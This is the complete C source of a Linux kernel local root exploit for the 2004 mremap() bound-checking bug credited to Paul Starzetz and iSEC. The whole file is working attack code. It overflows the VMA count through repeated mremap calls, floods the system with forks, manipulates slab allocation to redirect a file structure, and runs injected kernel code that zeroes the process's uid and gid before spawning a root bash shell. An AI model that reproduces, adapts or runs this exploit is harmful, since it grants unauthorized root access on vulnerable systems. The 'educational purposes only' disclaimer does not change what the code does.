/*
 * Linux kernel mremap() bound checking bug exploit.
 *
 * Bug found by Paul Starzetz <paul isec pl>
 *
 * Copyright (c) 2004  iSEC Security Research. All Rights Reserved.
 * Republish www.securitylab.ru
 * THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY* IT IS PROVIDED "AS IS"
 * AND WITHOUT ANY WARRANTY. COPYING, PRINTING, DISTRIBUTION, MODIFICATION
 * WITHOUT PERMISSION OF THE AUTHOR IS STRICTLY PROHIBITED.
 */

#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <syscall.h>
#include <signal.h>
#include <time.h>
#include <sched.h>

#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/wait.h>

#include <asm/page.h>

#define MREMAP_MAYMOVE	1
#define MREMAP_FIXED	2

#define str(s) 	#s
#define xstr(s) str(s)

#define DSIGNAL		SIGCHLD
#define CLONEFL		(DSIGNAL|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_VFORK)
#define PAGEADDR	0x2000

#define RNDINT		512

#define NUMVMA		(3 * 5 * 257)
#define NUMFORK		(17 * 65537)

#define DUPTO		1000
#define TMPLEN		256

#define __NR_sys_mremap	163

_syscall5(ulong, sys_mremap, ulong, a, ulong, b, ulong, c, ulong, d, ulong, e);
unsigned long sys_mremap(unsigned long addr, unsigned long old_len, unsigned long
new_len,
			 unsigned long flags, unsigned long new_addr);


static volatile int pid = 0, ppid, hpid, *victim, *fops, blah = 0, dummy = 0, uid,
gid;
static volatile int *vma_ro, *vma_rw, *tmp;
static volatile unsigned fake_file[16];


void fatal(const char * msg)
{
	printf("\n");
	if (!errno) {
		fprintf(stderr, "FATAL: %s\n", msg);
	} else {
		perror(msg);
	}

	printf("\nentering endless loop");
	fflush(stdout);
	fflush(stderr);
	while (1) pause();
}

void kernel_code(void * file, loff_t offset, int origin)
{
	int i, c;
	int *v;

	if (!file)
		goto out;

	__asm__("movl	%%esp, %0" : : "m" (c));

	c &= 0xffffe000;
	v = (void *) c;

	for (i = 0; i < PAGE_SIZE / sizeof(*v) - 1; i++) {
		if (v[i] == uid && v[i+1] == uid) {
			i++; v[i++] = 0; v[i++] = 0; v[i++] = 0;
		}
		if (v[i] == gid) {
			v[i++] = 0; v[i++] = 0; v[i++] = 0; v[i++] = 0;
			break;
		}
	}
out:
	dummy++;
}

void try_to_exploit(void)
{
	int v = 0;

	v += fops[0];
	v += fake_file[0];

	kernel_code(0, 0, v);
	lseek(DUPTO, 0, SEEK_SET);

	if (geteuid()) {
		printf("\nFAILED uid!=0"); fflush(stdout);
		errno =- ENOSYS;
		fatal("uid change");
	}

	printf("\n[+] PID %d GOT UID 0, enjoy!", getpid()); fflush(stdout);

	kill(ppid, SIGUSR1);
	setresuid(0, 0, 0);
	sleep(1);

	printf("\n\n"); fflush(stdout);

	execl("/bin/bash", "bash", NULL);
	fatal("burp");
}

void cleanup(int v)
{
	victim[DUPTO] = victim[0];
	kill(0, SIGUSR2);
}


void redirect_filp(int v)
{
	printf("\n[!] parent check race... "); fflush(stdout);

	if (victim[DUPTO] && victim[0] == victim[DUPTO]) {
		printf("SUCCESS, cought SLAB page!"); fflush(stdout);
		victim[DUPTO] = (unsigned) & fake_file;
		signal(SIGUSR1, &cleanup);
		kill(pid, SIGUSR1);
	} else {
		printf("FAILED!");
	}
	fflush(stdout);
}

int get_slab_objs(void)
{
	FILE * fp;
	int c, d, u = 0, a = 0;
	static char line[TMPLEN], name[TMPLEN];

	fp = fopen("/proc/slabinfo", "r");
	if (!fp)
		fatal("fopen");

	fgets(name, sizeof(name) - 1, fp);
	do {
		c = u = a =- 1;
		if (!fgets(line, sizeof(line) - 1, fp))
			break;
c = sscanf(line, "%s %u %u %u %u %u %u", name, &u, &a, &d, &d, &d, &d);
	} while (strcmp(name, "size-4096"));
	
	fclose(fp);

	return c == 7 ? a - u : -1;
}

void unprotect(int v)
{
	int n, c = 1;

	*victim = 0;
	printf("\n[+] parent unprotected PTE "); fflush(stdout);

	dup2(0, 2);
	while (1) {
		n = get_slab_objs();
		if (n < 0)
			fatal("read slabinfo");
		if (n > 0) {
			printf("\n    depopulate SLAB #%d", c++);
			blah = 0; kill(hpid, SIGUSR1);
			while (!blah) pause();
		}
		if (!n) {
			blah = 0; kill(hpid, SIGUSR1);
			while (!blah) pause();
			dup2(0, DUPTO);
			break;
		}
	}

	signal(SIGUSR1, &redirect_filp);
	kill(pid, SIGUSR1);
}

void cleanup_vmas(void)
{
	int i = NUMVMA;

	while (1) {
		tmp = mmap((void *) (PAGEADDR - PAGE_SIZE), PAGE_SIZE, PROT_READ,
				MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);
		if (tmp != (void *) (PAGEADDR - PAGE_SIZE)) {
			printf("\n[-] ERROR unmapping %d", i); fflush(stdout);
			fatal("unmap1");
		}
		i--;
		if (!i)
			break;

	tmp = mmap((void *) (PAGEADDR - PAGE_SIZE), PAGE_SIZE, PROT_READ|PROT_WRITE,
				MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
	if (tmp != (void *) (PAGEADDR - PAGE_SIZE)) {
			printf("\n[-] ERROR unmapping %d", i); fflush(stdout);
			fatal("unmap2");
		}
		i--;
		if (!i)
			break;
	}
}

void catchme(int v)
{
	blah++;
}

void exitme(int v)
{
	_exit(0);
}

void childrip(int v)
{
	waitpid(-1, 0, WNOHANG);
}

void slab_helper(void)
{
	signal(SIGUSR1, &catchme);
	signal(SIGUSR2, &exitme);
	blah = 0;

	while (1) {
		while (!blah) pause();

		blah = 0;
		if (!fork()) {
			dup2(0, DUPTO);
			kill(getppid(), SIGUSR1);
			while (1) pause();
		} else {
			while (!blah) pause();
			blah = 0; kill(ppid, SIGUSR2);
		}
	}
	exit(0);
}

int main(void)
{
	int i, r, v, cnt;
	time_t start;

	srand(time(NULL) + getpid());
	ppid = getpid();
	uid = getuid();
	gid = getgid();

	hpid = fork();
	if (!hpid)
		slab_helper();

	fops = mmap(0, PAGE_SIZE, PROT_EXEC|PROT_READ|PROT_WRITE,
			MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
	if (fops == MAP_FAILED)
		fatal("mmap fops VMA");
	for (i = 0; i < PAGE_SIZE / sizeof(*fops); i++)
		fops[i] = (unsigned)&kernel_code;
	for (i = 0; i < sizeof(fake_file) / sizeof(*fake_file); i++)
		fake_file[i] = (unsigned)fops;

	vma_ro = mmap(0, PAGE_SIZE, PROT_READ, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
	if (vma_ro == MAP_FAILED)
		fatal("mmap1");

	vma_rw = mmap(0, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
	if (vma_rw == MAP_FAILED)
		fatal("mmap2");

	cnt = NUMVMA;
	while (1) {
		r = sys_mremap((ulong)vma_ro, 0, 0, MREMAP_FIXED|MREMAP_MAYMOVE, PAGEADDR);
		if (r == (-1)) {
			printf("\n[-] ERROR remapping"); fflush(stdout);
			fatal("remap1");
		}
		cnt--;
		if (!cnt) break;

		r = sys_mremap((ulong)vma_rw, 0, 0, MREMAP_FIXED|MREMAP_MAYMOVE, PAGEADDR);
		if (r == (-1)) {
			printf("\n[-] ERROR remapping"); fflush(stdout);
			fatal("remap2");
		}
		cnt--;
		if (!cnt) break;
	}

	victim = mmap((void*)PAGEADDR, PAGE_SIZE, PROT_EXEC|PROT_READ|PROT_WRITE,
			MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
	if (victim != (void *) PAGEADDR)
		fatal("mmap victim VMA");

	v = *victim;
	*victim = v + 1;

	signal(SIGUSR1, &unprotect);
	signal(SIGUSR2, &catchme);
	signal(SIGCHLD, &childrip);
	printf("\n[+] Please wait...HEAVY SYSTEM LOAD!\n"); fflush(stdout);
	start = time(NULL);

	cnt = NUMFORK;
	v = 0;
	while (1) {
		cnt--;
		v--;
		dummy += *victim;

		if (cnt > 1) {
			__asm__(
			"pusha				\n"
			"movl %1, %%eax			\n"
			"movl $("xstr(CLONEFL)"), %%ebx	\n"
			"movl %%esp, %%ecx		\n"
			"movl $120, %%eax		\n"
			"int  $0x80			\n"
			"movl %%eax, %0			\n"
			"popa				\n"
			: : "m" (pid), "m" (dummy)
			);
		} else {
			pid = fork();
		}

		if (pid) {
			if (v <= 0 && cnt > 0) {
				float eta, tm;
				v = rand() % RNDINT / 2 + RNDINT / 2;
				tm = eta = (float)(time(NULL) - start);
				eta *= (float)NUMFORK;
				eta /= (float)(NUMFORK - cnt);
				printf("\r\t%u of %u [ %u %%  ETA %6.1f s ]          ",
				NUMFORK - cnt, NUMFORK, (100 * (NUMFORK - cnt)) / NUMFORK, eta - tm);
				fflush(stdout);
			}
			if (cnt) {
				waitpid(pid, 0, 0);
				continue;
			}
			if (!cnt) {
				while (1) {
					 r = wait(NULL);
					 if (r == pid) {
					cleanup_vmas();
					while (1) { kill(0, SIGUSR2); kill(0, SIGSTOP); pause(); }
					 }
				}
			}
		}

		else {
			cleanup_vmas();

			if (cnt > 0) {
				_exit(0);
			}

		printf("\n[+] overflow done, the moment of truth..."); fflush(stdout);
			sleep(1);

			signal(SIGUSR1, &catchme);
			munmap(0, PAGE_SIZE);
			dup2(0, 2);
			blah = 0; kill(ppid, SIGUSR1);
			while (!blah) pause();

			munmap((void *)victim, PAGE_SIZE);
			dup2(0, DUPTO);

			blah = 0; kill(ppid, SIGUSR1);
			while (!blah) pause();
			try_to_exploit();
			while (1) pause();
		}
	}
	return 0;
}

